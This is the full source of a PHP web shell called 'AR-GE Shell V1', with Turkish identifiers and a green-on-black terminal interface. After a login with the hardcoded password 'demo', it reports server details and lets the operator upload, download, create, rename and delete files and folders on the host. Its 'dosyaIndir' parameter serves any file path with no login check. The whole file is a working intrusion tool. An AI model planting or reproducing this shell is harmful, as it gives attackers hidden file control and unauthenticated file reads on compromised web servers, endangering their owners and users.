<?php
session_start();
error_reporting(0);
$shellDizini =  pathinfo("$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]");
$shellDosyaAdi = $shellDizini['basename'];
$girisSifre = "demo"; //Giriş Şifresi
if(isset($_GET["dosyaIndir"])){
	$indirilecekDosya = $_GET["dosyaIndir"];
	header($_SERVER["SERVER_PROTOCOL"]." 200 OK");
	header("Content-Type: application/zip");
	header("Content-Transfer-Encoding: Binary");
	header("Content-Length: ".filesize($indirilecekDosya));
	header("Content-Disposition: attachment; filename=\"".basename($indirilecekDosya)."\"");
	readfile($indirilecekDosya);
	exit;
}
function dizinFonksiyonu($dizinIsmi, $yapilacakIslem = "+"){
	if($yapilacakIslem == "-"){
		$mevcutDizin = "../";
	}else{
		$mevcutDizin = $dizinIsmi;
	}
	if(isset($_SESSION["dir"])){
		if(realpath($_SESSION["dir"]."/".$mevcutDizin) != ""){
			$_SESSION["dir"] = $_SESSION["dir"]."/".$mevcutDizin;
			echo '<b>Belirlenen dizine erişildi.</b>';
		}else{
			echo '<b><font color = "red">Bu dizinde böyle bir klasör mevcut değil!</font></b>';
		}
	}else{
		if(realpath($mevcutDizin) != ""){
			$_SESSION["dir"] = $mevcutDizin;
			echo '<b>Belirlenen dizine erişildi.</b>';
		}else{
			echo '<b><font color = "red">Bu dizinde böyle bir klasör mevcut değil!</font></b>';
		}
	}
}
function KlasorSil($silinecekKlasor) {
	if (substr($silinecekKlasor, strlen($silinecekKlasor)-1, 1)!= '/')
		$silinecekKlasor .= '/';
		if ($isle = opendir($silinecekKlasor)) {
			while ($klasorIcindekiler = readdir($isle)) {
				if ($klasorIcindekiler!= '.' && $klasorIcindekiler!= '..') {
					if (is_dir($silinecekKlasor.$klasorIcindekiler)) {
						if (!KlasorSil($silinecekKlasor.$klasorIcindekiler))
						return false;
					} elseif (is_file($silinecekKlasor.$klasorIcindekiler)) {
						if (!unlink($silinecekKlasor.$klasorIcindekiler))
						return false;
					}
				}
			}
			closedir($isle);
			if (!@rmdir($silinecekKlasor))
			return false;
			return true;
		}
	return false;
}
function turkceKarakter($cevrilmisDosyaIsmi){
	$turkceKarakterler = array('ş','Ş','ı','İ','ğ','Ğ','ü','Ü','ö','Ö','ç','Ç'," ");
	$ingilizceKarakterler = array('s','s','i','i','g','g','u','u','o','o','c','c',"-");
	$cevrilmisDosyaIsmi = str_replace($turkceKarakterler, $ingilizceKarakterler, $cevrilmisDosyaIsmi);
	$cevrilmisDosyaIsmi = strtolower($cevrilmisDosyaIsmi);
	$cevrilmisDosyaIsmi = str_replace('--', '--', $cevrilmisDosyaIsmi);
	$cevrilmisDosyaIsmi = trim($cevrilmisDosyaIsmi, '-');
	return $cevrilmisDosyaIsmi;
}
function dosyaBoyutHesapla($dosya){
	$dosyaBoyutlari = array('B', 'KB', 'MB', 'GB', 'TB', 'PB');
	for($i = 0; $dosya >= 1024 && $i < (count($dosyaBoyutlari) -1); $dosya /= 1024, $i++);
	return(round($dosya, 2) ." ". $dosyaBoyutlari[$i]);
}
function dosyaTuruTespit($dosya){
	if(is_file($dosya)){
		return($dosya = "Dosya");
	}else{
		return($dosya = "Klasör");
	}
}
function dosyaUzantiTespit($dosya){
	if(is_dir($dosya)){
		return($dosya = "-");
	}else{
		$dosyaUzantisi = pathinfo($dosya);
		return @$dosyaUzantisi['extension'];
	}
}
if(isset($_POST["phpGelenVeri"])){
	if(isset($_SESSION["girisOnay"])){
		if(isset($_SESSION["dir"])){
			$mevcutDizin = $_SESSION["dir"]."/";
		}else{
			$mevcutDizin = "";
		}
		if(isset($_FILES['yuklenecekDosyalar'])){
			$toplamYuklenecekDosya = count($_FILES['yuklenecekDosyalar']['name']);
			for($i = 0; $i < $toplamYuklenecekDosya; $i++){
				$yuklenecekDosyalarKonum = $_FILES['yuklenecekDosyalar']['tmp_name'][$i];
				if($yuklenecekDosyalarKonum != ""){
					if($mevcutDizin == "/"){
						$yuklenenDosyalarKonum = $_FILES['yuklenecekDosyalar']['name'][$i];
					}else{
						$yuklenenDosyalarKonum = "$mevcutDizin" . $_FILES['yuklenecekDosyalar']['name'][$i];
					}
					if(move_uploaded_file($yuklenecekDosyalarKonum, turkceKarakter($yuklenenDosyalarKonum))){
					}
				}
			}
		}
		if($_POST["phpGelenVeri"] == "sistem"){
			echo '<br>Sunucu işletim sistemi: <b><font color = "white">'.php_uname().'</font></b>';
			echo '<br>Sunucu sistemi: <b><font color = "white">'.$_SERVER['SERVER_SOFTWARE'].'</font></b>';
			echo '<br>PHP versiyonu: <b><font color = "white">'.PHP_VERSION.'</font></b>';
			if(ini_get('safe_mode')){
				echo '<br>Güvenli mod: <b><font color = "white">Açık</font></b>';
			}else{
				echo '<br>Güvenli mod: <b><font color = "white">Kapalı</font></b>';
			}
			echo '<br>Sunucu adı: <b><font color = "white">'.$_SERVER['SERVER_NAME'].'</font></b>';
			echo '<br>Sunucu yöneticisi: <b><font color = "white">'.$_SERVER['SERVER_ADMIN'].'</font></b>';
			echo '<br>Sunucu saati: <b><font color = "white">'.date('d.m.Y H:i:s').'</font></b>';
			echo '<br>Sunucu IP: <b><font color = "white">'.$_SERVER['SERVER_ADDR'].'</font></b>';
			echo '<br>Sunucu port: <b><font color = "white">'.$_SERVER['SERVER_PORT'].'</font></b>';
			echo '<br>Sunucu protokolü: <b><font color = "white">'.$_SERVER['SERVER_PROTOCOL'].'</font></b>';
		}
		elseif($_POST["phpGelenVeri"] == "ls"){
			echo '<table><tr><p>';
			echo '<th><font color ="white">Dosya adı</font></th>';
			echo '<th><font color ="white">Boyut</font></th>';
			echo '<th><font color ="white">Uzantı</font></th>';
			echo '<th><font color ="white">Son değişiklik tarihi</font></th>';
			echo '<th><font color ="white">İzinler</font></th>';
			echo '</tr></p>';
		
			if(array_diff(scandir($mevcutDizin."."), array('.', '..')) != ""){
				$foreach = array_diff(scandir($mevcutDizin."."), array('.', '..'));
			}else{
				$foreach = array();
			}
			foreach($foreach as $dosya){
				echo '<tr>';
				echo '<td>'.@$dosya.'</td>';
				echo '<td>'.@dosyaBoyutHesapla(@filesize(@$mevcutDizin.$dosya)).'</td>';
				echo '<td>'.@dosyaTuruTespit(@$mevcutDizin.$dosya).' / '.@dosyaUzantiTespit(@$mevcutDizin.$dosya).'</td>';
				echo '<td>'.@date('d.m.Y H:i:s', @filemtime(@$mevcutDizin.$dosya)).'</td>';
				echo '<td>'.substr(sprintf('%o', fileperms(@$mevcutDizin.$dosya)), -4).'</td>';
				echo '</tr>';
			}
		}
		elseif(explode(" ", $_POST["phpGelenVeri"])[0] == "dosyasil"){
			$girilenDosyaIsimleri = explode(" ", $_POST["phpGelenVeri"]);
			unset($girilenDosyaIsimleri[0]);
			foreach ($girilenDosyaIsimleri as $dosya) {
				if(file_exists($dosya) && is_file($dosya) && $dosya != $shellDosyaAdi){
					unlink($mevcutDizin.$dosya);
					echo '<br><b>'.$dosya.' İsimli dosya silindi.</b>';
				}else{
					echo '<br><b><font color = "red">'.$dosya.' İsminde bir dosya mevcut değil veya erişiminiz kısıtlı!</font></b>';
				}
			}
		}
		elseif(explode(" ", $_POST["phpGelenVeri"])[0] == "klasorsil"){
			$girilenKlasorIsimleri = explode(" ", $_POST["phpGelenVeri"]);
			unset($girilenKlasorIsimleri[0]);
			foreach($girilenKlasorIsimleri as $klasor){
				if(file_exists($klasor) && is_dir($klasor)){
					KlasorSil($mevcutDizin.$klasor);
					echo '<br><b>'.$klasor.' İsimli klasör silindi.</b>';
				}else{
					echo '<br><b><font color = "red">'.$klasor.' İsminde bir klasör mevcut değil veya erişiminiz kısıtlı!</font></b>';
				}
			}
		}
		elseif(explode(" ", $_POST["phpGelenVeri"])[0] == "dosyayarat"){
			$girilenDosyaIsimleri = explode(" ", $_POST["phpGelenVeri"]);
			unset($girilenDosyaIsimleri[0]);
			foreach($girilenDosyaIsimleri as $dosya){
				if(!file_exists($dosya)){
					touch($mevcutDizin.$dosya);
					echo '<br><b>'.$dosya.' İsimli dosya oluşturuldu.</b>';
				}else{
					echo '<br><b><font color = "red">'.$dosya.' İsminde bir dosya zaten mevcut veya erişiminiz kısıtlı!</font></b>';
				}
			}
		}
		elseif(explode(" ", $_POST["phpGelenVeri"])[0] == "klasoryarat"){
			$girilenKlasorIsimleri = explode(" ", $_POST["phpGelenVeri"]);
			unset($girilenKlasorIsimleri[0]);
			foreach ($girilenKlasorIsimleri as $klasor) {
				if(!file_exists($klasor)){
					mkdir($mevcutDizin.$klasor);
					echo '<br><b>'.$klasor.' İsimli klasör oluşturuldu.</b>';
				}else{
					echo '<br><b><font color = "red">'.$klasor.' İsminde bir dosya zaten mevcut veya erişiminiz kısıtlı!</font></b>';
				}
			}
		}
		elseif(explode(" ", $_POST["phpGelenVeri"])[0] == "yenidenadlandir"){
			$girilenDosyaIsimleri = explode(" ", $_POST["phpGelenVeri"]);
			unset($girilenDosyaIsimleri[0]);
			if($mevcutDizin == "/"){
				$mevcutDizin = "";
			}
			if(file_exists($mevcutDizin.$girilenDosyaIsimleri[1])){
				rename($mevcutDizin.$girilenDosyaIsimleri[1],$mevcutDizin.turkceKarakter($girilenDosyaIsimleri[2]));
				echo '<br><b>'.$girilenDosyaIsimleri[1].' isimli dosya adı '.turkceKarakter($girilenDosyaIsimleri[2]).' olarak değiştirildi.</b>';
			}else{
				echo '<br><b><font color = "red">'.$girilenDosyaIsimleri[1].' İsminde bir dosya mevcut değil veya erişiminiz kısıtlı!</font></b>';
			}
		}
		elseif(explode(" ", $_POST["phpGelenVeri"])[0] == "indir"){
			$girilenDosyaIsimleri = explode(" ", $_POST["phpGelenVeri"]);
			unset($girilenDosyaIsimleri[0]);
			if($mevcutDizin == "/"){
				$mevcutDizin = "";
			}
			if(file_exists($mevcutDizin.$girilenDosyaIsimleri[1])){
				echo '<b>Dosya indirilmek üzere hazır. <a download="'.$mevcutDizin.$girilenDosyaIsimleri[1].'" href="'.$shellDosyaAdi.'?dosyaIndir='.$mevcutDizin.$girilenDosyaIsimleri[1].'">İndir</a></b>';
			}else{
				echo '<b><font color="red">Dosya indirme Başarısız Oldu.</font></b>';
			}
		}
		elseif(explode(" ", $_POST["phpGelenVeri"])[0] == "cd"){
			if(substr(explode(" ", $_POST["phpGelenVeri"])[1], 0, 1) == "-"){
				dizinFonksiyonu(explode(" ", $_POST["phpGelenVeri"])[1],"-");
			}else{
				dizinFonksiyonu(explode(" ", $_POST["phpGelenVeri"])[1]);
			}
		} else {
			echo '<b><font color = "red">"'.$_POST["phpGelenVeri"].'" komut, mevcut değil. Komutlar için <font color = "white">yardim</font> yazın.</font></b>';
		}
	}else{
		if(explode(" ", $_POST["phpGelenVeri"])[0] == "giris"){
			if(explode(" ", $_POST["phpGelenVeri"])[1] == $girisSifre){
				$_SESSION["girisOnay"] = true;
				echo '<b>Giriş Başarılı.</b>';
			}else{
				echo '<b><font color = "red">Şifreniz yanlış!</font></b>';
			}
		}else{
			echo '<b><font color = "red">Lütfen giriş yapın!</font></b>';
		}
	}
	}else{
		unset($_SESSION["dir"]);
		unset($_SESSION["girisOnay"]);
?>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en">
<head>
	<meta http-equiv="Content-Type" content="charset=UTF-8">
	<script src='https://code.jquery.com/jquery-3.2.0.min.js'></script>
	<link rel="shortcut icon" href="https://raw.githubusercontent.com/sercanarga/AR-GE-SHELL-V1/master/Gorsel/icon.ico">
	<title>AR-GE Shell V1</title>
	<style>
		@import url('https://fonts.googleapis.com/css?family=Open+Sans');
		html, body{
			width: 100%;
			height: 100%;
			background: black;
			overflow: hidden;
			margin: 0px;
			padding: 0px;
			font-family: 'Open Sans', sans-serif;
		}
	    a:link{
	      text-decoration: none;
	      color: red;
	    }
	    a:visited{
	      text-decoration: none;
	      color: red;
	    }
	    a:hover{
	      text-decoration: underline;
	      color: red;
	    }
	    a:active{
	      text-decoration: underline;
	      color: red;
	    }
		.pencere{
			width: 100%;
			height: 100%;
			position: absolute;
			overflow: hidden;
		}
		.baslik{
			width: 100%;
			margin-top: 0px;
			text-align: center;
			font-family: 'Open Sans', sans-serif;
			font-size: 14px;
			color: #3dff00;
			background-color: #333;
		}
		.terminal{
			width: 100%;
			height: 100%;
			position: absolute;
			background: black;
			overflow: auto;
			padding-bottom: 40px;
			box-sizing: border-box;
		}
		.terminal input{
			width: 90%;
			display: inline-block;
			background: transparent;
			font-family: 'Open Sans', sans-serif;
			font-size: 14px;
			color: #3dff00;
			word-wrap: break-word;
      		border: none;
      		outline: none;
			cursor: default;
			position:relative;
			top: -3px;
			left: -2px
		}
		.terminal p{
			width: calc(100% - 32px);
			margin: 0 0 0 8px;
			white-space: pre;
			color: #3dff00;
			font-size: 14px;
		}
		.terminal p.command:before{
			content: "Shell>";
			margin-right: 7px;
		}
		.terminal span{
			min-width: 16px;
			max-width: 8% !important;
			overflow: hidden;
			white-space: nowrap;
			text-overflow: ellipsis;
			color: #3dff00;
			margin-left: 8px;
			display: inline-block;
			font-size: 14px;
		}
		.terminal span small{
			color:#dedede;
			font-size: 14px;
		}
		table{
			width: 50%;
			margin-left: 8px;
			border-collapse: collapse;
			font-family: 'Open Sans', sans-serif;
			font-size: 14px;
		}
		th, td{
			color: #3dff00;
			text-align: left;
			padding: 2px;
			font-size: 14px;
		}
		.cwLogo{
			position:fixed;
			bottom:1%;
			right: 1.5%;
			z-index: 1;
			opacity: 0.2;
		}
		.yaziSatiri{
			position:relative;
			font-family: 'Open Sans', sans-serif;
			z-index: 2;
		}
	</style>
</head>
<body>
	<section class='pencere'>
		<p class='baslik'><b>AR-GE Shell V1</b></p>
		<section class='terminal'>
			<img src="https://github.com/sercanarga/AR-GE-SHELL-V1/blob/master/Gorsel/cw.png?raw=true" class="cwLogo"/>
			<div class='yaziSatiri'>
				<span>Shell></span>
				<input class="command" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" unselectable="on" onselectstart="return false;" onmousedown="return false;" autofocus="autofocus"/>
			</div>
		<form action="" method="post"><input type="file" name="yuklenecekDosyalar[]" id="yukle" style="display: none" multiple="multiple"/><input type="hidden" name="phpGelenVeri" /></form>
<script type="text/javascript">
	$('.pencere').click(function() {
	$('input').focus();
	})
	var yardimKomutlar = '<b>--KOMUTLAR--</b>\
      <br><b><font color ="white">\tyardim -></font></b> Kullanım ile ilgili bilgileri verir.\
      <br><b><font color ="white">\tgiris -></font></b> AR-GE Shell V1"i kullanabilmek için giriş yapılmalıdır. <b><font color ="white">giris [sifreniz]</font></b> şeklinde kullanılır.\
      <br><b><font color ="white">\tsistem -></font></b> Sunucu ile ilgili ayrıntılı bilgileri verir.\
      <br><b><font color ="white">\ttemizle -></font></b> Tüm ekrandaki içerikleri temizler.\
      <br><b><font color ="white">\tls -></font></b> Bulunduğunuz dizindeki dosya bilgisini verir.\
       <br><b><font color ="white">\tcd -></font></b> Dizinler arası geçiş için kullanılır. Bulunduğunuz dizinde bir klasöre girmek için <b><font color ="white">cd [klasorismi]</font></b> bir üst dizine çıkmak için <b><font color ="white">cd -</font></b> kullanılır.\
      <br><b><font color ="white">\tyukle -></font></b> Bulunduğunuz dizine istediğiniz dosyaları yüklemek için kullanılır.\
        <br><b><font color ="white">\tindir -></font></b> Bulunduğunuz dizindeki istediğiniz dosyayı indirmek için kullanılır. Yalnızca dosya indirebilir. <b><font color ="white">indir [dosyaismi]</font></b> olarak kullanılır.\
      <br><b><font color ="white">\tyenidenadlandir -></font></b> Bulunduğunuz dizindeki dosya/klasör ismini değiştirmek için kullanılır. <b><font color ="white">yenidenadlandir [dosyaismi] [yenidosyaismi]</font></b> şeklinde de kullanılabilir.\
	<br><b><font color ="white">\tdosyayarat -></font></b> Dizine belirlenen dosyaları yaratır. <b><font color ="white">dosyayarat [dosyaismi] [dosyaismi2]..</font></b> şeklinde de kullanılabilir.\
      <br><b><font color ="white">\tdosyasil -></font></b> Dizindeki belirlenen dosyaları siler. <b><font color ="white">dosyasil [dosyaismi] [dosyaismi2]..</font></b> şeklinde de kullanılabilir.\
      <br><b><font color ="white">\tklasoryarat -></font></b> Dizine belirlenen klasörleri yaratır. <b><font color ="white">klasoryarat [klasorismi] [klasorismi2]..</font></b> şeklinde de kullanılabilir.\
      <br><b><font color ="white">\tklasorsil -></font></b> Dizindeki belirlenen klasörleri siler. <b><font color ="white">klasorsil [klasorismi] [klasorismi2]..</font></b> şeklinde de kullanılabilir.'
	$('input').on('keydown', function(e){
		var gelenKomut = $(this).val().trim();
		if(e.which == 13){
    
    	if(gelenKomut == ""){
    	
    	}
      
		else if(gelenKomut == "yardim"){
			$("<p>" + yardimKomutlar + "</p>").insertBefore(".yaziSatiri");
			$('.command').val("");
		}
		else if(gelenKomut == "temizle"){
			$("p").remove();
			$("table").remove();
			$("hr").remove();
			$('.command').val("");
		}
		else if(gelenKomut == "yukle"){
			if($("#yukle").hasClass("yukle")){
				$(".yukle").click();
				$("input:file").change(function(){
				e.preventDefault();
				var formData = new FormData($(this).parents('form')[0]);
				$.ajax({
					url: '<?=$shellDosyaAdi;?>',
					type: 'POST',
					xhr: function(){
					var myXhr = $.ajaxSettings.xhr();
					return myXhr;
					},
					success: function(data){
						$('<p class="command">Dosya yükleme işlemi başarılı oldu.</p>').insertBefore('.yaziSatiri');
						$('.command').val("");
					},
					error: function(jqXHR){
						$('<p class="command"><font color="red">Dosya yükleme işlemi başarısız oldu.</font></p>').insertBefore('.yaziSatiri');
						$('.command').val("");
					},
					data: formData,
					cache: false,
					contentType: false,
					processData: false
				});
				return false;
				});
		}else{
			$('<p class="command"><b><font color = "red">Lütfen giriş yapın!</font></b></p>').insertBefore('.yaziSatiri');
			$('.command').val("");
		}
		}else if(gelenKomut){
			$.ajax({
			url: "<?=$shellDosyaAdi;?>",
			method: "POST",
			data: {"phpGelenVeri": gelenKomut},
			success: function(data){
				$('<p class="command">' + data + '</p>').insertBefore('.yaziSatiri');
				$('.command').val("");
				if(data == "<b>Giriş Başarılı.</b>"){
					$('#yukle').addClass("yukle");
				}
			}
			})
	}
}
});
</script>
</section>
</section>
</body>
</html>
<?php
}
?>
